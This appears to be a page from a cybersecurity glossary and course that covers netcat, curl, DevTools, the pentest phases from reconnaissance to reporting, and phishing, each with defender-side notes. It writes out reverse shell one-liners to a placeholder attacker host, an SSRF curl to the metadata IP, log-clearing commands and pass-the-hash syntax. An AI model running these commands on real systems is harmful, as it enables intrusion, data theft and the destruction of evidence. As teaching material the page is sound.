② Explanation

Listener: nc -lvnp 4444. Client: nc target 80. Banner grab: nc -v target 22 shows SSH version. Port scan: nc -zv target 20-100 (slow, but works without nmap).

Reverse shell (target side, Bash): bash -i >& /dev/tcp/attacker/4444 0>&1 connects back to your listener. With nc on target: nc attacker 4444 -e /bin/bash (if -e is compiled in — ncat usually has it, openbsd-nc does not).

File transfer: receiver nc -lvnp 4444 > file, sender nc receiver 4444 < file. ncat (from nmap project) adds TLS, proxy, broker mode. socat is netcat on steroids.

③ Where It Appears
Reverse shell handler
Quick port check
File transfer between hosts
Service banner grabbing
④ How It Works
1Decide role: listener or client
2Open firewall on listener port
3Run nc -lvnp PORT on receiver
4Connect from other side
5Pipe data, get shell, transfer file
⑤ Common Use & Detection
Common Use
  • Listener for reverse shells
  • nc -e /bin/bash bind shell
  • Exfil over arbitrary port
  • Bypass weak egress filters
Detection
  • Egress filter outbound TCP
  • Block /bin/bash + nc -e patterns
  • EDR alerts on shell-spawning child processes
  • Network segmentation
⚠ Common Mistakes
❌ Beliefnetcat is just for chatting
✓ Realityit is the TCP/UDP swiss army knife
Why: listeners, transfers, banner grabbing, and reverse shells all run through nc.
❌ Beliefall netcats behave identically
✓ Realityvariants differ (-e is not always present)
Why: the OpenBSD build drops -e, so commands you copy may not work everywhere.
⑥ Remember This
If you can open a TCP socket, you can do anything. netcat is the socket.
FAQ
What is netcat?
A simple utility to read and write across TCP/UDP connections.
What is it used for?
Listeners, file transfers, banner grabbing, and reverse shells.
Why care in security?
It is a versatile staple for testing and connections.
Are there variants?
Yes — traditional, OpenBSD, and ncat differ in features.
My Notes
Auto-saved
Learned it? Next:T·11 curlB·14 Port (local)
cherry root › block 7 › T·11
curl
CLI HTTP client for testing APIs and crafting requests.
T·11httpcliapi
tags: Studied Review Hard Favorite
Before this term:W·06 Request & Response
① Simple Definition
"The browser is a curl with a graphical front-end."
curl sends HTTP/HTTPS requests from the command line. Every header, every byte, every method — controllable. Essential for API testing, scripting, recon and crafting exploits.
② Explanation

Basics: curl -i URL shows headers + body. -X POST sets method. -d 'k=v' body. -H 'Header: val' add header. -b 'cookie=x' cookies. -L follow redirects. -k ignore TLS errors.

For APIs: curl -X POST -H 'Content-Type: application/json' -d '{"k":"v"}' URL. With auth: -u user:pass (basic) or -H 'Authorization: Bearer TOKEN'.

Debug: -v verbose (shows full handshake + headers), --trace-ascii out.txt for full packet dump. -o file saves response. Burp can copy as curl from any request — best way to reproduce a finding.

③ Where It Appears
API exploration
CI/CD health checks
CTF / bug bounty PoCs
Server-to-server scripts
④ How It Works
1Reproduce target request in browser
2Copy as curl (Burp / DevTools)
3Tweak parameters in CLI
4Use -v to debug
5Wrap in shell loop for automation
⑤ Common Use & Detection
Common Use
  • SSRF PoC: curl -d 'url=http://169.254.169.254/'
  • Auth bypass: drop / forge headers
  • Path traversal via --path-as-is
  • Reproduce findings in a single line
Detection
  • Server-side input validation
  • Block requests with suspicious User-Agents
  • Egress filtering of internal targets
  • Sign + validate inter-service calls
⚠ Common Mistakes
❌ Beliefcurl can only do simple GETs
✓ Reality-X, -H and -d cover methods, headers, bodies
Why: curl can craft almost any HTTP request from the command line.
❌ Belief-k is fine to use everywhere
✓ Reality-k skips TLS verification (risky)
Why: ignoring certificate errors exposes you to man-in-the-middle attacks.
⑥ Remember This
If you can't curl it, you don't really understand the request.
FAQ
What is curl?
A command-line tool for making HTTP and other requests.
Why use it for hacking?
Scripting HTTP, testing APIs, and reproducing requests.
What are the key flags?
-X, -H, -d, -i, and -k.
curl vs Burp?
curl is scriptable; Burp is interactive and visual.
My Notes
Auto-saved
Learned it? Next:T·02 Burp SuiteW·08 Headers
cherry root › block 7 › T·12
Browser DevTools
Inspecting requests, cookies, JS and storage — built into every browser.
T·12webclientdebug
tags: Studied Review Hard Favorite
Before this term:W·12 Client & Server
① Simple Definition
"F12 opens the page's secret menu."
DevTools (F12 / Ctrl+Shift+I) exposes everything the browser does: DOM, network requests, JavaScript console, cookies, localStorage, performance, security. The first place to look on any web app.
② Explanation

Panels: Elements (live DOM/CSS edit), Console (run JS, see errors), Network (every request + response, copy as curl), Application (cookies, localStorage, sessionStorage, service workers), Sources (JS files, breakpoints, deobfuscation).

Quick wins: filter Network by Fetch/XHR for APIs. Right-click a request → Copy → cURL/fetch to reproduce. Application → Storage shows cookies — flip values to test access controls. Sources → Pretty print ({}) makes minified JS readable.

Hidden gems: command palette (Ctrl+Shift+P) jumps anywhere. monitorEvents(document, 'click') in console logs every click. Override response with Network → Override. Throttle to simulate slow networks.

③ Where It Appears
Every web pentest reconnaissance step
SPA / heavy-JS app analysis
Cookie + storage inspection
API discovery from front-end
④ How It Works
1Open DevTools (F12)
2Reload with Network open to catch all calls
3Inspect cookies + storage
4Read JS in Sources for endpoints / secrets
5Use Console to call functions directly
⑤ Common Use & Detection
Common Use
  • Find API endpoints from minified JS
  • Edit DOM to bypass client-side checks
  • Tamper localStorage / cookies
  • Read JS source for hardcoded secrets
Detection
  • Never trust client-side validation
  • Don't ship secrets in frontend bundles
  • Set HttpOnly + Secure + SameSite cookies
  • Source maps off in production
⚠ Common Mistakes
❌ BeliefJavaScript validation is security
✓ RealityDevTools edits it freely
Why: anyone can change client-side checks in seconds, so the server must re-validate.
❌ Beliefhidden form fields are safe
✓ Realitythey are visible and editable
Why: "hidden" only means not shown — the value is in the page and changeable.
⑥ Remember This
If it runs in the browser, you can see it, edit it, replay it. F12 is the cheat code.
FAQ
What are DevTools?
The browser's built-in inspector for pages and traffic.
Which tabs are useful?
Network, Console, and Application/Storage.
Why care in security?
Inspecting requests, editing the DOM, and reading client-side JS.
Do I need to install it?
No — it is built into every modern browser.
My Notes
Auto-saved
Learned it? Next:T·11 curlW·12 Client & Server
8
Block 8 · Pentest Methodology
The Phases
A pentest isn't ad-hoc clicking — it's a phased methodology. Recon, exploit, escalate, pivot, persist, exfil, cover, report. Each phase maps to MITRE ATT&CK tactics and has its own techniques and tooling.
reconscanningexploitprivescpersistencelateralexfilreport
10 terms · M01 → M10 method beats luck
cherry root › block 8 › M·01
Reconnaissance
Passive and active gathering of target intelligence.
M·01reconintelpassive
tags: Studied Review Hard Favorite
Before this term:S·06 Attack Surface
① Simple Definition
"You can't hit what you can't see. Recon is seeing."
Reconnaissance is phase 1 — collecting public and semi-public information about the target before sending a single packet that could trigger an alert. Splits into passive (no contact) and active (touches target).
② Explanation

Passive sources: OSINT — Google dorks, LinkedIn, GitHub, Shodan, Censys, crt.sh for certificates, DNS history, WHOIS, archive.org, breach databases (HaveIBeenPwned).

Active recon touches the target: port scans, banner grabs, web crawls, directory brute force. Loud but precise — you start measuring what's actually exposed today, not what was true last year.

MITRE ATT&CK tactic: TA0043 Reconnaissance. Techniques include T1595 Active Scanning, T1589 Gather Victim Identity, T1591 Gather Victim Org Info.

③ Where It Appears
First phase of every engagement
Bug bounty asset discovery
Red team pre-engagement
Threat intel gathering
④ How It Works
1Define scope clearly
2Passive: gather OSINT
3Map domains, subdomains, IPs
4Active: scan + enumerate live assets
5Build target inventory
⑤ Attacker & Defender
Attacker side
  • Shodan + Censys for exposed services
  • Subdomain enum (amass, subfinder)
  • crt.sh for certificate transparency
  • Email harvest from LinkedIn
Defender side
  • Minimize public footprint
  • Domain monitoring for typo-squats
  • Hide internal IPs in DNS
  • Train staff against LinkedIn over-share
⚠ Common Mistakes
❌ Beliefskip recon, go straight to exploits
✓ Realityrecon shapes the whole engagement
Why: knowing the target first makes every later step faster and more accurate.
❌ Beliefrecon is just scanning
✓ Realitypassive OSINT comes first
Why: passive gathering touches no target packets, so it is quiet and low-risk.
⑥ Remember This
The thinnest layer of public information is often the entire attack plan.
FAQ
What is reconnaissance?
Gathering information about a target before attacking.
Passive vs active?
Passive uses public sources; active probes the target directly.
Why do it first?
It reveals the attack surface and guides everything that follows.
What tools help?
OSINT, WHOIS, and search-engine dorking.
My Notes
Auto-saved
Learned it? Next:M·02 ScanningS·06 Attack Surface
cherry root › block 8 › M·02
Scanning
Port, service and version discovery on live targets.
M·02scanningportsservices
tags: Studied Review Hard Favorite
Before this term:M·01 Reconnaissance
① Simple Definition
"Recon tells you who. Scanning tells you what's running."
Scanning probes live hosts for open ports, running services and software versions. The output is the menu — every service is a potential entry point with its own CVE history.
② Explanation

Layers: host discovery (which IPs answer?), port scan (which TCP/UDP ports are open?), service detection (what's listening?), version detection (which exact build?), vuln scan (which CVEs match?).

Tools: nmap is the standard. masscan for huge ranges (millions of IPs / minute). rustscan wraps masscan + nmap. Vuln scanners: Nessus, OpenVAS, Nuclei (template-based, fast).

MITRE: T1046 Network Service Scanning. Defender side appears in IDS as port-scan signatures, SYN flood patterns, distributed slow scans.

③ Where It Appears
Right after recon
Continuous external attack-surface scanning
Compliance scans
Pre-exploitation
④ How It Works
1Confirm scope alignment
2Host discovery (ICMP / TCP ping)
3Port scan (top-1000 then full)
4Service + version detection
5Map findings to known CVEs
⑤ Attacker & Defender
Attacker side
  • nmap -sS -sV -p- target
  • masscan for /16 ranges
  • nuclei -l urls.txt
  • Cross-ref versions with NVD
Defender side
  • IDS port-scan signatures
  • Minimize attack surface (close ports)
  • Patch services to non-vuln versions
  • Honeypots in scan range
⚠ Common Mistakes
❌ Belieflouder and faster is better
✓ Realitynoisy scans trigger detection
Why: aggressive scanning lights up IDS alerts and logs.
❌ Beliefan open port means it is vulnerable
✓ Realityyou must still verify the service
Why: an open port only shows a service is listening, not that it is exploitable.
⑥ Remember This
Every open port is a promise to talk to strangers. Close what doesn't need to listen.
FAQ
What is scanning?
Actively probing a target to find hosts, ports, and services.
Port vs vulnerability scanning?
Port scans find open services; vuln scans check them for known flaws.
Why care?
It maps what is reachable and worth investigating.
What tool is standard?
nmap. See T·01.
My Notes
Auto-saved
Learned it? Next:M·03 EnumerationT·01 nmap
cherry root › block 8 › M·03
Enumeration
Extracting usernames, shares, banners and structural info.
M·03enumbannersusers
tags: Studied Review Hard Favorite
Before this term:M·02 Scanning
① Simple Definition
"Scanning finds the door. Enumeration reads the names on the buzzers."
Enumeration is targeted, deeper probing of each discovered service to pull structural information: usernames, group names, shares, mounts, software versions, configuration details.
② Explanation

Per-service tools: enum4linux / smbclient for SMB, ldapsearch for LDAP/AD, snmpwalk for SNMP, kerbrute for AD usernames, gobuster vhost for HTTP vhosts.

AD enumeration is huge: BloodHound visualizes attack paths from any user to Domain Admin. PowerView / SharpHound collect the data. Critical pre-exploit step on internal pentests.

MITRE: T1087 Account Discovery, T1135 Network Share Discovery, T1018 Remote System Discovery.

③ Where It Appears
Internal AD environments
Post-recon detail collection
Pre-exploitation prep
Compliance asset inventory
④ How It Works
1Pick service from scan output
2Run service-specific enum tool
3Collect names, shares, configs
4Cross-reference with previous data
5Identify exploit paths
⑤ Attacker & Defender
Attacker side
  • enum4linux -a target
  • BloodHound graph queries
  • kerbrute userenum users.txt
  • SNMP community string brute
Defender side
  • Disable null sessions
  • Restrict LDAP/SMB anonymous binds
  • Change default SNMP communities
  • Tier admin accounts (no shared)
⚠ Common Mistakes
❌ Beliefscanning and enumeration are the same
✓ Realityenumeration digs into services for detail
Why: scanning finds the door; enumeration reads the labels — versions, users, shares.
❌ Beliefskip enum, jump to exploit
✓ Realityenum finds the exact version to target
Why: the right exploit depends on the precise service and version you enumerate.
⑥ Remember This
Enumeration is the difference between knowing a service exists and knowing how it's used.
FAQ
What is enumeration?
Extracting detailed info from discovered services.
How is it different from scanning?
Scanning finds services; enumeration interrogates them.
What do you enumerate?
Usernames, shares, software versions, and directories.
Why care?
It turns a broad map into precise, actionable targets.
My Notes
Auto-saved
Learned it? Next:M·04 ExploitationT·06 Gobuster / Dirb
cherry root › block 8 › M·04
Exploitation
Triggering a vulnerability to gain unauthorized access.
M·04exploitcvepayload
tags: Studied Review Hard Favorite
Before this term:S·04 Exploit
① Simple Definition
"All the prep before this moment exists to make this moment work."
Exploitation uses a known or discovered vulnerability to gain initial code execution, data access or authentication bypass. The first time you cross the boundary into where you weren't supposed to be.
② Explanation

Categories: public exploits (ExploitDB, GitHub PoCs, Metasploit modules), web exploits (SQLi, XSS, SSRF, RCE in apps), credential-based (valid creds from spray / phish), 0-day (rare, expensive).

Quality bar: an exploit that works once and crashes the box is useless on real engagements. Prefer reliable, repeatable techniques — and always have a rollback plan if you crash a prod service.

MITRE tactic: TA0001 Initial Access + TA0002 Execution. Techniques: T1190 Exploit Public-Facing App, T1133 External Remote Services, T1078 Valid Accounts.

③ Where It Appears
After recon + scan + enum
CVE-matching phase
Phishing payload delivery
Web app pwn
④ How It Works
1Match service version to CVE
2Find / write working PoC
3Test in lab if possible
4Launch against target
5Confirm access + persist immediately
⑤ Attacker & Defender
Attacker side
  • Public PoC weaponization
  • Phishing payload to user
  • Web app SQLi → RCE chain
  • Credential reuse from leaks
Defender side
  • Patch CVEs within SLA
  • EDR + AV signatures
  • Network egress filtering
  • User awareness against phishing
⚠ Common Mistakes
❌ Beliefexploitation is the final goal
✓ Realityit is a means; impact and escalation matter
Why: a shell is just the start — the value is what you can reach and prove.
❌ Beliefany PoC works as-is
✓ Realityadapt it to the exact target
Why: offsets, versions, and configs differ, so PoCs usually need tuning.
⑥ Remember This
The vuln is the lock. The exploit is the key. The patch is the deadbolt.
FAQ
What is exploitation?
Using a vulnerability to gain access or control.
What is an initial foothold?
The first access you obtain on a target.
Why care?
It is the step that turns a finding into real access.
What tool helps?
Metasploit. See T·04.
My Notes
Auto-saved
Learned it? Next:M·05 Privilege EscalationT·04 Metasploit
cherry root › block 8 › M·05
Privilege Escalation
Moving from low-privilege user to root or SYSTEM.
M·05privescrootSYSTEM
tags: Studied Review Hard Favorite
Before this term:M·04 Exploitation
① Simple Definition
"Initial access usually gets you 'nobody'. Privesc gets you 'admin'."
Privilege Escalation elevates current access — from www-data to root on Linux, from user to SYSTEM on Windows. Without this step, most foothold shells are nearly useless.
② Explanation

Linux paths: SUID/SGID binaries with shell escapes (GTFOBins), sudo misconfigs (sudo -l), kernel exploits, writable cron jobs, exposed credentials in files, capabilities on binaries.

Windows paths: unquoted service paths, weak service permissions, AlwaysInstallElevated, token impersonation (SeImpersonatePrivilege → JuicyPotato / PrintSpoofer), UAC bypass, kernel exploits.

Helpers: linpeas.sh, linenum.sh, winPEAS, PowerUp.ps1, seatbelt. They automate the 100+ enumeration checks. MITRE: TA0004 Privilege Escalation.

③ Where It Appears
After every foothold
Cloud IAM (assume-role chains)
Container escapes
AD path-to-DA
④ How It Works
1Enumerate as current user
2Run automated checkers
3Inspect interesting findings manually
4Pick reliable path
5Escalate + verify
⑤ Attacker & Defender
Attacker side
  • Abuse SUID + GTFOBins shell
  • Hijack writable cron job
  • Token impersonation on Windows
  • Cloud role-chain to admin
Defender side
  • Least privilege rigorously
  • Patch kernel + service binaries
  • Audit sudoers, SUID, services
  • Monitor for unusual privilege use
⚠ Common Mistakes
❌ Beliefa shell means full control
✓ Realityyou often land low-priv; escalate to root/admin
Why: the initial foothold is usually a limited account that must be elevated.
❌ Beliefprivesc is always a kernel exploit
✓ Realitymisconfigs are more common
Why: weak sudo rules, SUID binaries, and bad service permissions are easier paths.
⑥ Remember This
A foothold is a chair. Privilege escalation is the chair becoming a throne.
FAQ
What is privilege escalation?
Gaining higher rights than you started with.
Vertical vs horizontal?
Vertical gains more power; horizontal moves to another user's access.
Common vectors?
Sudo misconfig, SUID binaries, cron jobs, and weak services.
What tools help?
Enumeration scripts like linpeas.
My Notes
Auto-saved
Learned it? Next:M·06 PersistenceL·08 Root & Sudo
cherry root › block 8 › M·06
Persistence
Maintaining access through reboots, patches and detection sweeps.
M·06persistencebackdoorcron
tags: Studied Review Hard Favorite
Before this term:M·05 Privilege Escalation
① Simple Definition
"Get back in tomorrow without re-exploiting today."
Persistence is the set of techniques that ensure continued access to a compromised system. The exploit may be patched, the password rotated — but the backdoor remains.
② Explanation

Linux: cron jobs, systemd services, SSH authorized_keys, bashrc hooks, web shells in document root, rootkits (LKM, eBPF, LD_PRELOAD).

Windows: scheduled tasks, services, registry Run keys (HKCU/HKLM \Software\Microsoft\Windows\CurrentVersion\Run), WMI subscriptions, DLL hijacking, Sticky Keys backdoor.

AD: create new accounts, modify AdminSDHolder, plant Golden/Silver Tickets, DSRM password. MITRE: TA0003 Persistence — over 70 techniques.

③ Where It Appears
Right after privesc
Long-haul red team ops
APT campaigns
Insider threat scenarios
④ How It Works
1Pick blend-in mechanism
2Plant backdoor in unused path
3Test access after reboot
4Layer 2-3 different mechanisms
5Document for cleanup later
⑤ Attacker & Defender
Attacker side
  • Add SSH key to authorized_keys
  • Cron job pulling C2 every hour
  • Service that auto-restarts on boot
  • Golden Ticket forging
Defender side
  • Baseline + alert new persistence locations
  • File integrity monitoring (Wazuh, OSSEC)
  • Disable unused services
  • Rotate Kerberos krbtgt twice
⚠ Common Mistakes
❌ Beliefone shell is enough
✓ Realityestablish persistence to survive reboots
Why: a single session dies on reboot or disconnect — persistence keeps access.
❌ Beliefpersistence is invisible
✓ Realityit leaves artifacts defenders hunt
Why: new cron jobs, services, and keys are exactly what blue teams look for.
⑥ Remember This
Exploitation gets you in once. Persistence is how you stay.
FAQ
What is persistence?
Maintaining access to a system across reboots and time.
What are common methods?
Cron jobs, services, startup items, and added SSH keys.
Why care?
It is how attackers avoid having to break in again.
How is it detected?
By auditing scheduled tasks, services, and authorized keys.
My Notes
Auto-saved
Learned it? Next:M·07 Lateral MovementL·14 Cron
cherry root › block 8 › M·07
Lateral Movement
Pivoting from one compromised host to others.
M·07lateralpivotnetwork
tags: Studied Review Hard Favorite
Before this term:M·06 Persistence
① Simple Definition
"One box is a foothold. Many boxes is a campaign."
Lateral Movement spreads access across the internal network — from the initial host to file servers, domain controllers, databases, jump boxes. Where the real impact is built.
② Explanation

Windows/AD techniques: Pass-the-Hash (PtH), Pass-the-Ticket, Kerberoasting, WMI remote exec, PsExec, RDP, WinRM (evil-winrm).

Network pivoting: SSH tunnels (-L, -D), chisel, ligolo-ng, proxychains over a SOCKS proxy. Turns a single foothold into a launchpad for the rest of the LAN.

MITRE: TA0008 Lateral Movement. Techniques include T1021 Remote Services, T1550 Use Alternate Authentication Material (PtH/PtT), T1570 Lateral Tool Transfer.

③ Where It Appears
Internal pentests after initial foothold
Red team campaigns
Ransomware spread phase
AD compromise chains
④ How It Works
1Inventory reachable hosts
2Reuse credentials / hashes
3Choose silent protocol (WMI > PsExec)
4Tunnel attacker tools through pivot
5Repeat until DA / objective
⑤ Attacker & Defender
Attacker side
  • evil-winrm -i host -u user -H hash
  • impacket-psexec
  • SSH dynamic forward + proxychains
  • Kerberoast service accounts
Defender side
  • Network segmentation (no flat AD)
  • LAPS for local admin passwords
  • Disable NTLM where possible
  • Detect anomalous PtH / WMI
⚠ Common Mistakes
❌ Beliefone box is the whole network
✓ Realitypivot to reach the real targets
Why: the first machine is rarely the goal — it is a stepping stone to high-value systems.
❌ Belieflateral movement needs new exploits
✓ Realitystolen creds and keys often suffice
Why: reused passwords and harvested keys let attackers just log in elsewhere.
⑥ Remember This
Defense in depth is meant to make lateral movement loud and slow.
FAQ
What is lateral movement?
Moving from one compromised host to others in the network.
How is it done?
Reused credentials, pass-the-hash, and pivoting through hosts.
Why care?
It is how attackers reach the data and systems that matter.
What stops it?
Network segmentation and Zero Trust. See S·08.
My Notes
Auto-saved
Learned it? Next:M·08 ExfiltrationS·08 Zero Trust
cherry root › block 8 › M·08
Exfiltration
Stealing data from the target via covert channels.
M·08exfildatastealth
tags: Studied Review Hard Favorite
Before this term:M·07 Lateral Movement
① Simple Definition
"You got in. You looted. Now get the loot out without tripping the alarm."
Exfiltration moves sensitive data from inside the target network to attacker-controlled infrastructure. Often the actual objective — credentials, IP, PII, source code, financial data.
② Explanation

Channels: HTTPS to cloud storage (looks like normal browsing), DNS tunneling (encode data in subdomain queries — slow but very evasive), cloud sync abuse (Dropbox, OneDrive), email, encrypted ZIPs to webmail.

Encode + compress + encrypt before sending. Throttle to blend with normal traffic. Split into chunks to dodge DLP thresholds. Use legitimate domains and signed binaries to bypass URL filters.

MITRE: TA0010 Exfiltration. Techniques: T1041 Exfil Over C2, T1048 Alternative Protocol, T1567 Exfil Over Web Service, T1011 Exfil Over Physical Medium.

③ Where It Appears
Final phase of objective
Ransomware double-extortion
Espionage / APT campaigns
Insider threat scenarios
④ How It Works
1Stage data on compromised host
2Compress + encrypt
3Choose covert channel
4Throttle + chunk
5Verify off-site, wipe staging
⑤ Attacker & Defender
Attacker side
  • DNS tunneling via dnscat2 / iodine
  • Upload to attacker S3 / Dropbox
  • Exfil over HTTPS POST
  • Steganography in images
Defender side
  • DLP on outbound traffic
  • Block unsanctioned cloud services
  • DNS query anomaly detection
  • Egress filtering + proxy inspection
⚠ Common Mistakes
❌ Beliefexfil over any channel is fine
✓ Realityblend with normal traffic (DNS, HTTPS)
Why: data leaving over odd ports stands out; hiding in common protocols evades detection.
❌ Belieflarge transfers go unnoticed
✓ RealityDLP and anomaly detection flag volume
Why: sudden big outbound transfers are a classic alert for defenders.
⑥ Remember This
An attacker who can't take anything out has done less damage than they think.
FAQ
What is exfiltration?
Stealing data out of a compromised environment.
What channels are used?
HTTPS, DNS tunneling, and cloud storage.
Why care?
It is the step where the actual data breach happens.
What defends against it?
Data Loss Prevention and egress monitoring.
My Notes
Auto-saved
Learned it? Next:M·09 Covering TracksW·03 DNS
cherry root › block 8 › M·09
Covering Tracks
Clearing logs and removing artifacts to delay detection.
M·09antiforensicslogscleanup
tags: Studied Review Hard Favorite
Before this term:L·15 Log Files
① Simple Definition
"No log, no investigation. (Until the SIEM ships logs off the host.)"
Covering Tracks erases or modifies forensic evidence of the intrusion — log entries, command history, dropped files, timestamps. The goal is to delay detection long enough to extend access or evade attribution.
② Explanation

Linux: clear ~/.bash_history (or set HISTFILE=/dev/null), edit /var/log/auth.log, wtmp, btmp. Touch files to backdate. Unset LD_PRELOAD traces. Modern systems ship logs off-host within seconds — local edits don't save you.

Windows: clear event logs (wevtutil cl Security), but this itself logs event 1102. Sophisticated: selective tampering via EventCleaner, time-stomping via SetMACE, kernel-level rootkits.

MITRE: TA0005 Defense Evasion. Techniques: T1070 Indicator Removal on Host, T1562 Impair Defenses. Pro tip: don't rely on this. Modern blue teams have remote logging.

③ Where It Appears
Late stage of attack
Insider trying to hide
APT long-haul ops
Malware self-cleanup
④ How It Works
1Identify what logs your actions
2Tamper / clear those logs
3Remove dropped tools
4Time-stomp artifacts
5Test detection still works against you
⑤ Attacker & Defender
Attacker side
  • Clear bash_history + wtmp
  • wevtutil cl Security
  • Time-stomp uploaded binaries
  • Stop + tamper auditd
Defender side
  • Remote log shipping (immutable)
  • SIEM alerts on log clear
  • File integrity monitoring
  • Tamper-evident audit logs
⚠ Common Mistakes
❌ Beliefdeleting local logs hides everything
✓ Realitycentral logging / SIEM keeps copies
Why: logs shipped off the host survive even when the local ones are wiped.
❌ Beliefclearing logs is stealthy
✓ Realitymissing or edited logs are an alert
Why: a gap in the logs is itself a strong indicator of compromise.
⑥ Remember This
If logs only live on the host, they belong to whoever owns the host.
FAQ
What is covering tracks?
Attempting to hide evidence of an intrusion.
What are the methods?
Clearing logs and altering timestamps (timestomping).
Why is it hard now?
Central SIEMs and immutable logging keep off-host copies.
What about authorized tests?
You document actions rather than truly hide them.
My Notes
Auto-saved
Learned it? Next:M·10 ReportingD·03 SIEM
cherry root › block 8 › M·10
Reporting
Documenting findings for the client — the actual product.
M·10reportdeliverableclient
tags: Studied Review Hard Favorite
Before this term:M·09 Covering Tracks
① Simple Definition
"The shell wasn't the deliverable. The report is."
Reporting is the final phase — translating attack steps, evidence and impact into a document the client can act on. A great pentest with a bad report is a failure.
② Explanation

Sections: Executive Summary (1 page, business-language risk + impact, no jargon), Scope + Methodology, Findings (one per vuln: description, evidence, severity (CVSS), affected assets, reproduction steps, remediation), Appendices.

Each finding needs: clear title, CVSS v3.1 score, screenshots/PoC, exact steps to reproduce, business impact in plain English, prioritized fix recommendation. Severity should align with real exploitability, not just CVSS base.

Tooling: Dradis, Faraday, Serpico, SysReptor. Templates save 50% of the time. Keep evidence organized from day 1 — don't scramble at the end.

③ Where It Appears
Last phase of every engagement
Client deliverable
Compliance audits
Bug bounty submissions
④ How It Works
1Collect evidence as you go
2Draft executive summary
3Detail each finding with PoC
4Map severity + business impact
5Deliver + walk client through report
⑤ Attacker & Defender
Attacker side
  • Reproduce every finding cleanly
  • Provide working PoC
  • Map to MITRE ATT&CK for context
  • Suggest concrete remediation
Defender side
  • Receive report, prioritize fixes
  • Patch + verify with retest
  • Update controls based on root cause
  • Run regression scans
⚠ Common Mistakes
❌ Beliefthe exploit is the deliverable
✓ Realitythe report is the product clients pay for
Why: findings only create value when communicated clearly enough to fix.
❌ Beliefjust list the findings
✓ Realityinclude impact, evidence, and remediation
Why: a finding without business impact and a fix is hard for the client to act on.
⑥ Remember This
The report is what the client buys. The shells are just receipts.
FAQ
Why does reporting matter?
It is the deliverable that lets the client actually improve security.
What goes in a report?
Findings, severity, evidence, and remediation steps.
Who is the audience?
Both technical staff and executives — write for both.
Why care?
A clear report is what drives the fixes that reduce real risk.
My Notes
Auto-saved
Learned it? Next:M·01 ReconnaissanceD·09 Incident Response
9
Block 9 · Social Engineering
Hacking the Human
The cheapest, oldest and most effective attack vector — people. No CVE, no patch, no antivirus signature. Just trust, urgency, authority and the right pretext.
phishingspearpretextingbaitingvishingsmishingtailgateimpersonation
10 terms · E01 → E10 the wetware is always vulnerable
cherry root › block 9 › E·01
Phishing
Mass email to trick clicks, credentials or attachment execution.
E·01socialengemailmass
tags: Studied Review Hard Favorite
Before this term:S·02 Threat
① Simple Definition
"Cast a wide net. Catch whoever bites."
Phishing sends fraudulent emails — typically impersonating trusted brands (banks, Microsoft, DocuSign, IT) — to large numbers of recipients hoping a small percentage click, log in or run an attachment.
② Explanation

Common payloads: credential harvesting (fake login page that captures username/password), malware delivery (macro-enabled docs, ISO/IMG bypassing MOTW, HTML smuggling), BEC (Business Email Compromise — invoice fraud).

Indicators: sender domain that looks off (microsft.com), generic greeting, urgent tone ("account closing in 24h"), mismatched link preview, unexpected attachment, grammar that's too clean or too broken.

Tooling: Gophish, King Phisher, EvilGoPhish, Evilginx2 (real-time MitM phishing — captures session cookies, bypasses MFA). MITRE: T1566 Phishing.

③ Where It Appears
External red team start
Initial access in real breaches
Tax-season / holiday spikes
Brand impersonation campaigns
④ How It Works
1Pick pretext + brand to impersonate
2Register lookalike domain
3Build landing page + email
4Send to bulk list
5Capture creds / detonate payload
⑤ Attack & Defense
Attack technique
  • Fake O365 login via Evilginx (MFA bypass)
  • Invoice PDF dropper
  • "Password reset" email to staff
  • Brand-impersonation domain
Defense awareness
  • SPF + DKIM + DMARC enforced
  • Phishing-resistant MFA (FIDO2)
  • User reporting button + reward
  • Email gateway URL rewriting
⚠ Common Mistakes
❌ BeliefI can always spot a phishing email
✓ Realitymodern phishing is highly convincing
Why: attackers copy real branding and tone — overconfidence is exactly what they exploit.
❌ Beliefthe padlock means the link is safe
✓ RealityHTTPS phishing sites are common
Why: a certificate is free and easy, so the padlock says nothing about honesty.
⑥ Remember This
Phishing isn't an email problem. It's a trust problem with email as the vector.
FAQ
What is phishing?
Tricking people into revealing info or clicking malicious links, usually by email.
How do I spot it?
Check the real sender, watch for urgency, and hover over links.
Why is it so effective?
It targets human trust, not technical flaws.
What is the defense?
Verify requests, enable MFA, and train people.
My Notes
Auto-saved
Learned it? Next:E·02 Spear PhishingS·02 Threat
cherry root › block 9 › E·02
Spear Phishing
Targeted phishing with personalized lure for one person or small group.
E·02socialengtargetedpersonalized
tags: Studied Review Hard Favorite
Before this term:E·01 Phishing
① Simple Definition
"Mass phishing is dynamite. Spear phishing is a sniper rifle."
Spear Phishing targets a specific individual (often C-level, finance, IT admin) with a highly personalized message based on OSINT — their boss's name, recent project, vendor relationships.
② Explanation

Recon-heavy: attacker spends hours/days reading LinkedIn, press releases, conference talks, GitHub, leaked databases. Then crafts a single email that fits the victim's context perfectly — sometimes referencing real ongoing work.

Sub-variant: whaling targets executives specifically. CEO fraud impersonates the CEO asking finance to wire money urgently. Often combined with timing (CEO traveling, can't be verified).

Click rates: generic phishing ~3%, spear phishing 30%+. The personalization defeats most user training. MITRE: T1566.001/002 Spearphishing Attachment / Link.

③ Where It Appears
High-value target compromise
Nation-state campaigns
Wire-fraud BEC
Privileged-account takeover
④ How It Works
1Pick high-value target
2Build deep OSINT profile
3Craft tailored pretext
4Send single email at right time
5Convert click into access
⑤ Attack & Defense
Attack technique
  • CFO gets fake invoice from real vendor
  • CEO impersonation to wire transfer
  • Targeted MFA-bypass via Evilginx
  • Conference-follow-up lure
Defense awareness
  • Out-of-band verification for wires
  • Phishing-resistant MFA
  • Executive-protection awareness
  • Restrict who can approve transfers
⚠ Common Mistakes
❌ Beliefphishing and spear phishing are identical
✓ Realityspear phishing is targeted and researched
Why: it uses personal details (your name, role, projects) to feel authentic.
❌ Beliefonly random people get phished
✓ Realityexecutives are prime targets (whaling)
Why: high-access individuals are worth the extra research to attackers.
⑥ Remember This
The personal touch is the payload. Verify with a phone call before you act on an email.
FAQ
Spear vs regular phishing?
Spear phishing is tailored to a specific person or group.
What is whaling?
Spear phishing aimed at executives or other high-value targets.
Why is it more dangerous?
Personalization makes it far more believable.
What is the defense?
Verify unusual requests through a separate, trusted channel.
My Notes
Auto-saved
Learned it? Next:E·03 PretextingE·01 Phishing
cherry root › block 9 › E·03
Pretexting
Fabricated scenario to extract information or trigger action.
E·03socialengscenariotrust
tags: Studied Review Hard Favorite
Before this term:E·01 Phishing
① Simple Definition
"Build a story believable enough that the right answer feels like helping."
